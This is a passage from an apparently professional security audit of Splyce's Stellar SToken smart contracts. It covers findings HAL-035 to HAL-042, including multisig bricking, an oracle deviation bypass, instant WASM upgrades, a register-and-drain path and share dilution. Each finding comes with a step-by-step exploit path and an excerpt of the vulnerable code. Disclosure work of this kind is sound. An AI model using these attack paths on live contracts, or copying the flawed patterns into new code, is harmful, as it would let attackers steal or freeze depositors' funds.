| **Firm severity rating** | Low, BVSS 2.0 2.34 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:H/I:N/D:H/Y:N) (source: HAL-35) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/multisig/src/multisig.rs:L103-L106`, `contracts/multisig/src/multisig.rs:L91-L95` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/46321f0a966a70465041f99aeabb8a1cf14c8d8a |
| **Redacted** | false |

**Description.**

`Multisig.remove_signer()` and `Multisig.remove_context_rule()` do not validate that the stored `SimpleThreshold` value remains satisfiable after the mutation, enabling any current quorum of signers, whether through a configuration mistake or compromised keys, to permanently brick the multisig account.

The `stellar_accounts` library's `validate_signers_and_policies` does enforce a single guard: at least one signer OR one policy must remain after removal. It does **not** enforce that `threshold ≤ remaining_signer_count`. This is the actual gap, not a complete absence of guards as previously stated.

#### Sub-issue A: Threshold/signer-set divergence via remove_signer (unmitigated)

The `remove_signer` wrapper in `multisig.rs` passes directly to the library without any satisfiability check:

```rust
fn remove_signer(e: &Env, context_rule_id: u32, signer: Signer) {
    e.current_contract_address().require_auth();
    remove_signer(e, context_rule_id, &signer);
}
```

Example, 3-of-3 lockout (accidental or adversarial):

1. Multisig deployed with signers A, B, C and `SimpleThreshold.threshold = 3`.
2. The current quorum (A+B+C) calls `remove_signer(signer=C)`.
3. Library guard passes: 2 signers still remain. Threshold is unchanged at 3.
4. The `do_check_auth` path in `stellar_accounts::simple_threshold` checks `threshold > context_rule.signers.len()` and returns `InvalidThreshold` on every subsequent `__check_auth` attempt.
5. The account is permanently locked; `set_threshold` cannot be called because calling it requires `e.current_contract_address().require_auth()`, which itself goes through `__check_auth`.

#### Sub-issue B: Default context rule deletion via remove_context_rule (unmitigated)

The `remove_context_rule` wrapper has no guard preventing deletion of the Default rule:

```rust
fn remove_context_rule(e: &Env, context_rule_id: u32) {
    e.current_contract_address().require_auth();
    // No check preventing removal of the Default (id=0) context rule
    remove_context_rule(e, context_rule_id);
}
```

If the Default rule is deleted, `do_check_auth` finds no matching rule for any invocation and fails unconditionally; no recovery path exists on-chain.

**Impact.**

Any current quorum of signers, through misconfiguration or key compromise, can render the multisig account permanently unresponsive. All manager-gated SToken vault operations become inaccessible; a subsequent guardian pause permanently freezes depositor principal with no recovery path, as `emergency_withdraw` also requires the manager role. The WASM upgrade escape path has no effect: the upgrader role was never granted in any contract, so there is no on-chain remediation path for the frozen state.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- **Add a post-removal satisfiability check in** `remove_signer`**:** Before delegating to the library, verify that `remaining_signer_count >= threshold`. If the removal would violate this invariant, reject the call and require the caller to lower the threshold via `set_threshold` first.
- **Guard Default context rule deletion in** `remove_context_rule`**:** Identify Default rules by their `ContextRuleType` and reject removal.
- **Document and test the required invariant:** Add a `validate_account_operable` helper and call it from `add_signer` and `remove_signer` to assert that at least one Default rule exists with `signers.len() >= threshold` after every mutation.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding across commits [46321f0](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/46321f0a966a70465041f99aeabb8a1cf14c8d8a), [a45c74a](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/a45c74a5fbe0e6653ce10610abd4d3b3df2cffb7), [4a498e0](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4a498e07a7634e096ba51d096cb258299a5a570c), [367b855](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/367b85576359cede2f0f6022dc7013f6d067bd0d) by adding a threshold-satisfiability check to `remove_signer` and an unexpired-Default-rule guard (covering both direct removal and expiry-based bricking) to `remove_context_rule`/`update_context_rule_valid_until`.

Halborn remediation date: 2026-07-11.

---

### [SPLYCE-HAL-036] max_deviation_bps Zero Disables Oracle Price Deviation Guard

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.34 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:H/D:H/Y:N) (source: HAL-36) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | oracle-external-dependency |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/dd7b112bc6d9a53e3b7f970e23c7305cb257feac |
| **Redacted** | false |

**Description.**

`SToken.update_price()` conditions the entire deviation-based oracle security gate on `read_max_deviation_bps(&env) > 0 && read_price_acceptance_cooldown_secs(&env) > 0`. When `max_deviation_bps == 0`, the else-branch labeled "legacy behavior" executes, applying any submitted price immediately to the live vault price without a deviation check, without queuing it as pending, and without requiring manager acceptance via `accept_price()`.

The `propose_limits` / `accept_limits` governance flow allows `max_deviation_bps` to be set to 0: the validation at lines 811-814 enforces only an upper bound (`deviation > MAX_ALLOWED_DEVIATION_BPS` = 2000 bps) with no lower bound. A manager who sets `max_deviation_bps = 0` through the normal governance timelock (minimum 1 hour via `config_cooldown_secs`) then causes `update_price` to execute the legacy-behavior branch, applying any oracle-submitted price without deviation checking.

This attack requires two role compromises in sequence: the manager must set `max_deviation_bps = 0` and then a (separately or jointly compromised) oracle submits the manipulated price. The `config_cooldown_secs` (minimum 1 hour) provides an observation window before the change takes effect but does not prevent it if undetected.

**Step-by-step (manager + oracle collusion):**

1. Manager calls `propose_limits(new_max_deviation_bps=Some(0), ...)`, allowed by validation.
2. `config_cooldown_secs` elapses (minimum 1 hour).
3. Manager calls `accept_limits`, `max_deviation_bps` is now 0.
4. Oracle calls `update_price(10_000_000)` (10x the initial 1_000_000).
5. Bypass branch executes: price immediately set to 10_000_000, no pending state, no manager review.

#### Code Location

`SToken.update_price()`**:** bypass branch when `max_deviation_bps == 0`

```rust
// contracts/stoken/src/stoken.rs
// line 961: entire deviation gate conditioned on max_deviation_bps > 0
if read_max_deviation_bps(&env) > 0 && read_price_acceptance_cooldown_secs(&env) > 0 {
    // ACTIVE path: deviation checked, large movements go pending
    let deviation_bps = calculate_price_deviation(old_price, new_price)?;
    if deviation_bps <= max_deviation_bps {
        write_price(&env, &new_price);
    } else {
        write_pending_price(&env, Some(PendingPrice { value: new_price, timestamp }));
    }
} else {
    // BYPASS path (line 1006): "legacy behavior", no deviation check
    write_price(&env, &new_price); // any price applied immediately
    write_last_price_update_timestamp(&env, &timestamp);
    write_pending_price(&env, None);
}
```

`SToken.propose_limits()`**:** no lower bound on `max_deviation_bps`

```rust
// contracts/stoken/src/stoken.rs
if let Some(deviation) = new_max_deviation_bps {
    if deviation > MAX_ALLOWED_DEVIATION_BPS { // line 812: only upper bound
        return Err(STokenCoreError::InvalidFee);
    }
    // No lower bound: deviation = 0 explicitly permitted
}
```

**Impact.**

With `max_deviation_bps == 0`, the oracle role can apply any arbitrary price, including extreme manipulation, in a single transaction with no timelocked review, allowing unlimited value extraction from depositors and existing share holders via share mispricing.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Redefine the semantics of `max_deviation_bps == 0` to mean "all price updates require manager acceptance" (stricter) rather than "no deviation check" (weaker). This eliminates the bypass path entirely.
- Alternatively, enforce a minimum non-zero value for `max_deviation_bps` in `propose_limits` validation.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding across commits [dd7b112](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/dd7b112bc6d9a53e3b7f970e23c7305cb257feac), [dde1777](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/dde17775916fef663ff0adcc8d4d8be999ac952a) by removing the legacy bypass branch in `update_price` (making the deviation/pending mechanism unconditional) and then rejecting `max_deviation_bps == 0` at both `initialize` and `propose_limits`, enforcing `0 < bps <= MAX_ALLOWED_DEVIATION_BPS`.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-037] Instant Single-Key WASM Upgrade Bypasses All Governance Timelocks

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.34 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:H/D:H/Y:N) (source: HAL-37) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/7183258bc2591e9be118ce1c75a97793a1876f99 |
| **Redacted** | false |

**Description.**

All seven upgradeable contracts (SToken, Factory, Accountant, Asset, FixedYieldOracle, NavOracle, ProxyAssetManager) allow immediate, irreversible WASM replacement in a single transaction with no propose/accept two-step flow, no timelock, and no cooldown. The upgrade path requires only a single `upgrader`-role key administered by `admin`. Nothing in the protocol enforces that `admin` or `upgrader` be a Multisig smart account rather than a plain Ed25519 keypair.

Every other sensitive SToken operation (fee changes, limit changes, role changes, cooldown changes) is protected by timelocked propose/accept governance flows; WASM replacement is not. The STRIDE threat model document (`docs/stoken/STRIDE_THREAT_MODEL_STOKEN.md`, Elevation.8.R.1) acknowledges this gap with the note "Consider a separate, longer timelock for upgrades (e.g., 7 days)", confirming this is a known unimplemented control.

The factory's `propose_vault_wasm_hash` / `accept_vault_wasm_hash` mechanism provides a cooldown for future vault deployments but has no effect on live-contract upgrades.

**Exploit path (compromised** `upgrader` **key, SToken example):**

1. Attacker compromises the `upgrader` key for a live SToken vault holding user funds.
2. Attacker uploads malicious WASM to the Stellar network via `uploadWasm()`.
3. Attacker calls `SToken.upgrade(malicious_wasm_hash, attacker_upgrader_address)`: no cooldown, no pending step, executes immediately.
4. `env.deployer().update_current_contract_wasm(malicious_wasm_hash)` runs within the same ledger close.
5. From the next ledger, all SToken invocations execute the malicious code.

#### Code Location

`SToken._require_auth()`**:** no cooldown or two-step before WASM replacement

```rust
// contracts/stoken/src/stoken.rs, lines 3492-3497
impl UpgradeableInternal for SToken {
    fn _require_auth(e: &Env, operator: &Address) {
        access_control::ensure_role(e, operator, &Symbol::new(e, "upgrader"));
        operator.require_auth();
        // No cooldown check, no pending/accept step
        // upgrade() immediately calls env.deployer().update_current_contract_wasm()
    }
}
// All six other contracts implement the identical pattern.
```

**Impact.**

A single compromised `upgrader` key enables full code replacement of any live contract within one ledger close (~5 seconds), with no observation window for users or the community to react. For SToken vaults: attacker can drain all user deposits and pending withdrawal funds immediately after upgrade. For NavOracle/FixedYieldOracle: attacker can push arbitrary prices to all associated vaults, enabling over-valued redemptions. The asymmetry with all other timelocked governance operations means the highest-impact change in the protocol (full code replacement) has the weakest protection.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Implement a timelocked two-step upgrade mechanism for all seven contracts, consistent with the factory's `propose_vault_wasm_hash` / `accept_vault_wasm_hash` pattern.
- Set the upgrade cooldown significantly longer than operational cooldowns; a minimum of 7 days (604,800 seconds) is recommended to provide adequate community observation time.
- Operationally require that `admin` and `upgrader` roles be held by a Multisig smart account, raising the bar from a single compromised key to an M-of-N threshold.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by replacing the single-step `Upgradeable` derive with a bespoke `propose_upgrade`/`accept_upgrade`/`cancel_upgrade` flow gated by a hardcoded 7-day `UPGRADE_COOLDOWN_SECS` and hash-binding, across all seven upgradeable contracts.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-038] Manager Can Drain Vault Funds Without Adequate Delay Controls

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.34 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:N/D:H/Y:H) (source: HAL-38) |
| **Difficulty / likelihood** | null |
| **Status** | Risk Accepted |
| **Remediation verified by** | not-reviewed |
| **Category** | governance-centralization |
| **Location** | `contracts/proxy_asset_manager/src/constants.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/1dc7b8949dc90362b753b4611e0721cc963b8549 |
| **Redacted** | false |

<!-- CONVERSION-NOTE: remediation commit present on a finding marked Risk Accepted; consider Partially Resolved -->

**Description.**

Two related gaps in `ProxyAssetManager` together allow a compromised manager key to drain all available vault liquidity to an attacker-controlled address within a single block, with no monitoring window.

**Gap 1: No timelock on custody whitelist (**`add_target`**,** `activate_target`**):** `add_target()` and `activate_target()` execute immediately under `#[only_role(caller, "manager")]` with no pending-proposal step and no cooldown. All other privileged configuration changes in this contract, manager transfer, processor transfer, limits, are gated behind `propose`/`accept` timelocks. A compromised manager can register an attacker-controlled `target_custody` address as a valid forwarding destination in the same ledger as the drain.

**Gap 2: No per-operation cooldown on manager forwarding path:** `forward_funds()` applies `check_manager_limits` (daily counter and `max_per_tx`) for the manager branch, but `record_manager_operation()` only increments the `manager_daily_used` counter; it never writes `LastOperationTime`. The processor path writes `LastOperationTime` via `record_processor_operation()` and enforces it via `check_processor_limits()`. A compromised manager can issue as many `forward_funds` calls per block as needed until the full daily limit (`DEFAULT_MANAGER_DAILY_LIMIT = 10,000,000,000,000` units; constants verified in `constants.rs`) is exhausted, requiring `daily_limit / max_per_tx = 10` consecutive calls.

**Combined exploit path:**

1. Attacker compromises the manager key.
2. Manager calls `add_target(attacker_contract, attacker_custody, manager)`; `write_target` executes immediately; attacker's custody is now a valid forwarding destination with no delay.
3. Manager issues 10 consecutive `forward_funds(attacker_contract, 1_000_000_000_000, manager)` calls (one per `max_per_tx`); no per-op cooldown prevents this.
4. All 10 calls succeed; `10,000,000,000,000` units are transferred to `attacker_custody` within a single block.
5. No guardian or admin action is possible between steps 2 and 4; there is no event-monitored cooldown window.

#### Code Location

`ProxyAssetManager.add_target()`: immediate write, no timelock

```rust
#[only_role(caller, "manager")] // line 153
pub fn add_target(
    env: Env,
    target_contract: Address,
    target_custody: Address,
    caller: Address,
) -> Result<(), ProxyAssetManagerError> {
    // ...
    write_target(&env, &target_contract, &config); // line 173, instant, no cooldown
    Ok(())
}
```

`ProxyAssetManager.record_manager_operation()`: no LastOperationTime written

```rust
fn record_manager_operation(env: &Env, amount: u64) -> Result<(), ProxyAssetManagerError> { // line 997
    let used = read_manager_daily_used(env);
    write_manager_daily_used(
        env,
        used.checked_add(amount) // line 1004
            .ok_or(ProxyAssetManagerError::MathOverflow)?,
    );
    // No write_last_operation_time call here, contrast with record_processor_operation below
    Ok(())
}
```

`ProxyAssetManager.record_processor_operation()`**:** correctly writes LastOperationTime (contrast)

```rust
fn record_processor_operation(env: &Env, amount: u64, current_time: u64) -> Result<(), ProxyAssetManagerError> { // line 982
    // ...
    write_last_operation_time(env, current_time); // line 993, enforces per-op cooldown
    Ok(())
}
```

**Impact.**

A compromised manager key can register an attacker-controlled custody address and drain the full configured daily limit (up to `DEFAULT_MANAGER_DAILY_LIMIT = 10,000,000,000,000` base units) to it within a single block. Because there is no per-operation cooldown on the manager forwarding path, the full daily limit can be exhausted in as few as `daily_limit / max_per_tx` calls. No guardian, admin, or monitoring system has an opportunity to react between the target registration and the fund drain.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- **For custody whitelist timelocking (higher priority):** introduce a `propose_target`/`accept_target` two-step flow with a dedicated `target_change_cooldown`, mirroring the `propose_manager`/`accept_manager` pattern. Newly proposed target addresses should only become eligible for `forward_funds` after the cooldown elapses. `deactivate_target` and `remove_target` may remain instant (fail-safe direction); only `add_target` and `activate_target` require the timelock. Emit a pending-change event with the proposed acceptance timestamp to enable off-chain monitoring.
- **For per-operation manager cooldown (defense-in-depth):** add a `write_last_manager_operation_time` call inside `record_manager_operation` and a corresponding check in `check_manager_limits` mirroring `check_processor_limits`. If the manager is intentionally trusted for higher forwarding velocity (e.g., because it is a Multisig), document this explicitly and treat the daily limit as the sole velocity control.

**Remediation notes.**

**RISK ACCEPTED:** The **Splyce team** partially fixed this finding in the specified commit by introducing a `target_change_cooldown` timelock so `add_targetactivate_target` no longer make a custody address instantly forwardable, closing the higher-priority register-and-drain-same-block path (Gap 1). For the remaining gap, the absence of a per-operation cooldown on the manager forwarding path (`record_manager_operation`/`check_manager_limits` unchanged), the client made a business decision to accept the risk and not alter the contracts further, stating:

> Gap 2 deliberately documented as accepted (multisig manager; daily limit + `max_per_tx` are the velocity controls).

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-039] Multisig CallContract Rules Scope To Entire Contract

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.34 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:H/D:H/Y:N) (source: HAL-39) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/multisig/src/multisig.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/0b6235173dce158e550f52273a8399a70d5b1a29 |
| **Redacted** | false |

**Description.**

`Multisig.add_context_rule()` accepts a caller-supplied `ContextRuleType::CallContract(contract)` with no restriction on which contract it targets, and the underlying `stellar_accounts` rule-matching logic selects a context rule by the target `contract` address alone, discarding the specific function being called.

**Exploit path:**

1. Multisig signers, at full quorum, create a second `ContextRule` for a contract the Multisig already governs privileged calls into, for example `ContextRuleType::CallContract(stoken_address)`, with a lower-threshold `ThresholdPolicy` intended to speed up one specific low-risk call such as `accept_price`.
2. `Multisig.add_context_rule()` forwards this `context_type` to the library unchanged; nothing checks that the rule is scoped to a specific function selector.
3. On any subsequent invocation, `get_validated_context()` in `stellar_accounts::smart_account::storage` matches a `Context::Contract(ContractContext { contract, .. })` against `ContextRuleType::CallContract(contract)` using only the `contract` field; the `fn_name` and `args` fields of the `ContractContext` are discarded via `..` and never consulted.
4. The matched rule's policy is `stellar_accounts::policies::simple_threshold`, whose `can_enforce`/`enforce` functions take a `_context: &Context` parameter that is explicitly unused and check only `authenticated_signers.len() >= threshold`.
5. A subset of signers who meet the lower threshold can call any manager-gated function on the target contract, `propose_roles`, `emergency_withdraw`, `pause_vault`, not only the function the rule was created for.

#### Code Location

`Multisig.add_context_rule()`**:** forwards an unrestricted target contract

```rust
// contracts/multisig/src/multisig.rs
fn add_context_rule( // line 62
    e: &Env,
    context_type: ContextRuleType,
    name: String,
    valid_until: Option<u32>,
    signers: Vec<Signer>,
    policies: Map<Address, Val>,
) -> ContextRule {
    e.current_contract_address().require_auth();

    add_context_rule(e, &context_type, &name, valid_until, &signers, &policies)
}
```

`get_validated_context()`(stellar-accounts 0.5.0 dependency): rule selection ignores fn_name and args

```rust
// stellar-accounts-0.5.0/src/smart_account/storage.rs
pub fn get_validated_context( // line 316
    e: &Env,
    context: &Context,
    all_signers: &Vec<Signer>,
) -> (ContextRule, Context, Vec<Signer>) {
    let context_rules = match context.clone() {
        Context::Contract(ContractContext { contract, .. }) => {
            get_valid_context_rules(e, &ContextRuleType::CallContract(contract))
        },
```

`simple_threshold::can_enforce()` (stellar-accounts 0.5.0 dependency): policy never inspects the context

```rust
// stellar-accounts-0.5.0/src/policies/simple_threshold.rs
pub fn can_enforce( // line 141
    e: &Env,
    _context: &Context,
    authenticated_signers: &Vec<Signer>,
    context_rule: &ContextRule,
    smart_account: &Address,
) -> bool {
    // ...
    authenticated_signers.len() >= threshold // line 157
}
```

**Impact.**

A `ContextRule` created for one narrow, low-risk purpose on a contract the Multisig already governs, for example faster `accept_price` approval, silently authorizes every other manager-gated call on that same contract at the same relaxed threshold, including `propose_roles`, which can reassign the manager to an attacker-controlled address, and `emergency_withdraw`, which pays out to the caller. A subset of signers who were only ever meant to approve routine operations can gain unilateral, permanent control over the governed contract.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend one of the following, implemented in `Multisig` itself:

- Have `Multisig.add_context_rule()` reject any `CallContract` rule whose threshold is weaker than the Default rule's for that same target contract.
- Or write a companion policy contract that checks `context.fn_name` before enforcing, and require it on any relaxed-threshold `CallContract` rule.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by adding an `assert_scoped_rule_quorum` guard that rejects any `CallContract` rule (at creation and on every subsequent quorum-weakening mutation) whose effective signer quorum falls below the account's weakest Default-rule quorum, closing the privilege-escalation path without needing to alter the underlying `stellar_accounts` matching logic.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-040] WASM Hash Proposal Silently Overwritable With No Cancel Path

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.19 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:M/D:H/Y:N) (source: HAL-40) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/factory/src/factory.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/237de60e4494744ff9f9e34338f9cd18646d83d6 |
| **Redacted** | false |

**Description.**

`Factory.propose_vault_wasm_hash()` unconditionally overwrites any existing `PendingWasmHash` entry without a guard or acknowledgment, and there is no `cancel_vault_wasm_hash()` function in the contract. The behavior is confirmed intentional by the test coverage (`test_propose_vault_wasm_hash_overwrites_pending`).

This creates two distinct concerns:

#### Concern 1: Silent overwrite enables timing attacks (requires compromised admin key)

1. Admin (or attacker with compromised admin key) calls `propose_vault_wasm_hash(safe_hash_H1)`; monitoring systems record the pending `H1`.
2. Near the end of the cooldown period (e.g., 1 second before `effective_time`), attacker calls `propose_vault_wasm_hash(malicious_hash_H2)`, silently replacing the proposal and resetting the cooldown timer.
3. Monitoring systems that poll at intervals or deduplicate events by content may miss the replacement.
4. After the new cooldown expires, `accept_vault_wasm_hash()` commits `H2`.
5. All future vaults deployed by the factory execute malicious code.

#### Concern 2: No cancel path creates operational risk

Without a `cancel_vault_wasm_hash()` function, an incorrect proposal cannot be cleared without issuing a replacement that resets the cooldown and creates governance confusion.

#### Code Location

`Factory.propose_vault_wasm_hash()`**:** unconditional overwrite

```rust
// contracts/factory/src/factory.rs, lines 216–222
write_pending_wasm_hash(
    &env,
    Some(PendingWasmHash {
        wasm_hash: wasm_hash.clone(),
        timestamp, // always reset to current time, any prior proposal silently replaced
    }),
);
// No check for existing pending proposal before writing
```

`Factory.accept_vault_wasm_hash()`**:** accepts whichever hash is currently pending

```rust
// contracts/factory/src/factory.rs, lines 238–268
let pending = read_pending_wasm_hash(&env)
    .ok_or(FactoryError::NoPendingWasmHashChange)?;
// Accepts the most recently written pending hash with no reference to the originally announced one
```

**Impact.**

A compromised admin key can execute a last-minute proposal swap that bypasses monitoring systems operating on polling intervals longer than 1 Stellar ledger close (~5 seconds), resulting in a malicious WASM hash being accepted for all future vault deployments: a protocol-level takeover vector. Legitimate operators cannot cancel an erroneous proposal without issuing a replacement, creating unnecessary governance overhead and potentially confusing community monitoring.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add a `cancel_vault_wasm_hash()` function that allows the admin to clear the pending proposal without issuing a replacement.
- Add a guard in `propose_vault_wasm_hash` that requires the admin to pass the existing pending hash as a confirmation parameter when overwriting, proving they are aware of the replacement.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding across commits [237de60](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/237de60e4494744ff9f9e34338f9cd18646d83d6), [8ca05fc](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/8ca05fcb9b25cc79068ec91522a99770272bd76d) by adding an event-emitting `cancel_vault_wasm_hash()` and rejecting `propose_vault_wasm_hash` with `PendingWasmHashExists` whenever a proposal is already pending, requiring an explicit on-chain cancellation before any replacement. Additional commit [4a498e0](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4a498e07a7634e096ba51d096cb258299a5a570c) also contributed (comment clarification only, no functional change).

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-041] Asset Manager Rotation Strands Externally Deployed Funds

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.19 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:M/D:H/Y:N) (source: HAL-41) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | liveness-dos |
| **Location** | `contracts/stoken/src/stoken.rs`, `contracts/proxy_asset_manager/src/proxy_asset_manager.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/0fcbe14a58bc920e35d05d5b3c84f681f5e6044c |
| **Redacted** | false |

**Description.**

`SToken::accept_roles` atomically revokes the old `asset_manager` role with no migration window, invalidating `ProxyAssetManager::return_funds` authorization for any capital deployed before the rotation.

**Exploit path:**

1. Processor calls `SToken.process_deposits`, transferring X USDC from the vault to `OldProxy`. `OldProxy` forwards funds to an external investment target.
2. Manager calls `propose_roles(new_asset_manager = NewProxy)` and, after `role_change_cooldown_secs`, calls `accept_roles`. Lines 625–627 grant `NewProxy` the `asset_manager` role and atomically revoke it from `OldProxy`.
3. `OldProxy` calls `stoken.return_funds(amount, old_proxy)`. The `#[only_role(caller, "asset_manager")]` macro reverts because `old_proxy` no longer holds the role.
4. `NewProxy` holds the role but has no visibility into `OldProxy`'s external positions and cannot invoke `return_funds` on those positions' behalf.

#### Code Location

`SToken::return_funds`**:** role gate blocks old proxy after rotation

```rust
// contracts/stoken/src/stoken.rs
#[only_role(caller, "asset_manager")]  // line 1171
pub fn return_funds(env: Env, amount: u64, caller: Address) -> Result<(), STokenCoreError> {
```

`SToken.accept_roles()`**:** old role revoked atomically, no grace period

```rust
// contracts/stoken/src/stoken.rs
if let Some(asset_manager) = pending_roles.new_asset_manager {
    access_control::grant_role_no_auth(&env, &caller, &asset_manager, &asset_manager_role);
    if asset_manager != old_asset_manager {
        access_control::revoke_role_no_auth(&env, &caller, &old_asset_manager, &asset_manager_role); // line 627
    }
```

`ProxyAssetManager.__constructor`**:** vault address immutable after init, no setter

```rust
// contracts/proxy_asset_manager/src/proxy_asset_manager.rs
write_vault(&env, &config.vault); // line 74
```

**Impact.**

All capital forwarded via `process_deposits` that has not been returned before the rotation is blocked from the normal accounting return path.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend preserving the outgoing asset manager's authorization to return funds, but not to receive new capital deployments, for a bounded migration window after role rotation, with this window closeable by the manager only once all externally deployed funds have been fully returned and that close condition enforced on-chain where possible to prevent premature revocation from reintroducing the stranding problem.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding across commits [0fcbe14](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/0fcbe14a58bc920e35d05d5b3c84f681f5e6044c), [6747379](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/674737995c9d6ce83573b98dd9dca7e33a8240a3), [4507153](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4507153d506ee128007d50d590a0d970ce98be57) by opening an indefinite, manager-closable migration window that lets the outgoing asset manager keep return-only authorization after rotation, and blocking overlapping rotations while a window is open.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-042] 100% System Penalty Ceiling Enables Unbounded Share Dilution on TTL Cancel

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.19 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:M/D:H/Y:N) (source: HAL-42) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | state-archival-ttl |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/9e8d7c580507d93dbb6fd6a27c0dce01dbdc80f3 |
| **Redacted** | false |

**Description.**

`SToken.propose_withdrawal_params()` validates `new_system_penalty_bps` only against `BPS_PRECISION = 10_000` (100%), so any value from 0 to 10,000 bps inclusive is accepted. In `cancel_withdrawal()`, when a withdrawal request's TTL has expired, `penalty_shares_to_mint = apply_basis_points(shares_after_fee, read_system_penalty_bps(&env))` mints additional shares to the user as compensation for processor delay. At `system_penalty_bps = 10_000`, `penalty_shares_to_mint = shares_after_fee`, so the canceling user receives their original `shares_after_fee` returned plus an equal quantity of freshly minted shares, doubling their position and diluting every remaining holder.

**Exploit path (compromised manager key):**

1. Manager calls `propose_withdrawal_params(None, None, Some(10_000))`. Accepted because `10_000 <= BPS_PRECISION`.
2. Config cooldown elapses; manager calls `accept_withdrawal_params()`. `system_penalty_bps` is now 10,000.
3. Any user with a TTL-expired pending withdrawal request calls `cancel_withdrawal()`.
4. `penalty_shares_to_mint = shares_after_fee * 10_000 / 10_000 = shares_after_fee`. User receives `shares_after_fee + fee_shares + shares_after_fee` (double `shares_after_fee` plus fees returned).
5. Each such cancellation dilutes all remaining holders. With large pending requests or multiple users, aggregate dilution can be severe.

#### Code Location

`SToken.propose_withdrawal_params()`: `BPS_PRECISION` as ceiling permits 100% penalty

```rust
// contracts/stoken/src/stoken.rs
if let Some(penalty) = new_system_penalty_bps { // line 2575
    if penalty > crate::constants::BPS_PRECISION { // BPS_PRECISION = 10_000; 100% is accepted
        return Err(STokenConfigurationCooldownError::InvalidConfigChange);
    }
}
```

`SToken.cancel_withdrawal()`: penalty shares minted at TTL expiry

```rust
// contracts/stoken/src/stoken.rs
// TTL expired: user gets full refund including fees
shares_to_transfer_to_user = shares_after_fee + fee_shares; // line 1589
penalty_shares_to_mint =
    apply_basis_points(shares_after_fee, read_system_penalty_bps(&env))
        .map_err(|_| STokenWithdrawalRequestError::MathOverflow)?;
```

**Impact.**

